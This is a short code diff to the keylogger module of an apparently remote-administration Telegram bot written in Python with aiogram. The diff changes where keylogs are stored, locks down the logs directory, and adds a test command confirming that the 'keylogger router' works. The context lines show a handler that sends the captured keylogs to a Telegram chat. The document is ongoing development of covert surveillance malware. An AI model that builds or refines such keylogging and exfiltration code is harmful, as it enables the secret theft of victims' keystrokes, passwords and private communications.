@@ -11,10 +11,14 @@ from datetime import datetime
 router = Router()
 
 # File to store keylogs
-KEYLOG_FILE = "/opt/pyradm/keylog.txt"
+KEYLOG_FILE = "logs/keylog.txt"
 
-# Ensure logs directory exists
+# Ensure logs directory exists with correct permissions
 os.makedirs('logs', exist_ok=True)
+try:
+    os.chmod('logs', 0o700)  # Restrict access to logs directory
+except Exception as e:
+    logging.error(f"Failed to set permissions on logs directory: {e}")
 
 # Global variable to store keylog data temporarily
 keylog_data = []
@@ -68,6 +72,13 @@ async def send_keylog(message: types.Message):
     except Exception as e:
         logging.error(f"Error sending keylog: {e}")
         await message.answer(f"Error sending keylog: {str(e)}")
+
+
+@router.message(Command("test"))
+async def test_command(message: types.Message):
+    """Test command to verify router functionality."""
+    logging.info(f"Test command received from chat {message.chat.id}")
+    await message.answer("Keylogger router is working!")
 
 
 def setup_keylogger():
